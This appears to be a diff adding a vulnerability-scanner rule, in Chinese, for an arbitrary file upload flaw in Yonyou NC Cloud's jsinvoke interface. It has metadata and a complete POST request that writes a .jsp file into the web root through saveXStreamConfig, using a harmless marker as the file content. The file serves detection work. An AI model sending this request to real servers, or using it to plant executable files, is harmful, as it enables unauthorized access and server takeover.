@@ -1,0 +1,24 @@
+{
+    "vul_name": "用友 NC Cloud jsinvoke 任意文件上传漏洞",
+    "level": "高危",
+    "description": "用友 NC Cloud jsinvoke 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件至服务器中，获取系统权限",
+    "product": "用友NC Cloud",
+    "version": "用友 NC cloud",
+    "cve": "无",
+    "reference": "https://blog.csdn.net/qq_56698744/article/details/134731967",
+    "fixing": "及时安装该漏洞补丁包",
+    "rule": {
+        "path": "/uapjs/jsinvoke/?action=invoke",
+        "method": "POST",
+        "headers": "Content-Type: application/x-www-form-urlencoded;charset=UTF-8",
+        "body": "{\"serviceName\":\"nc.itf.iufo.IBaseSPService\",\"methodName\":\"saveXStreamConfig\",\r\n\"parameterTypes\":[\"java.lang.Object\",\"java.lang.String\"],\r\n\"parameters\":[\"123456\",\"webapps/nc_web/2YIOmzdcUDhwMYTLk65p3cgxvxy.jsp\"]}",
+        "status_code": "200",
+        "keywords": "server",
+        "res_time": ""
+    },
+    "operator": {
+        "author": "浪飒",
+        "email": "langsa-hy@qq.com",
+        "github": "https://github.com/langsasec"
+    }
+}
